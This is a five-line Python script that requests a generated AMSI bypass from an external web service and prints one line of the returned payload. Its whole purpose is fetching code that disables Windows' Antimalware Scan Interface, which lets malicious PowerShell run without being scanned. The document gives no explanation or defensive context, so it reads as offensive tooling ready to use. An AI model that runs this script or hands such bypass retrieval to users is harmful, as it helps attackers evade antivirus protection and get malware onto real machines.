import requests

amsi_bypass = requests.get('https://amsi-fail.azurewebsites.net/api/Generate')

print(amsi_bypass.text.split('\n')[1])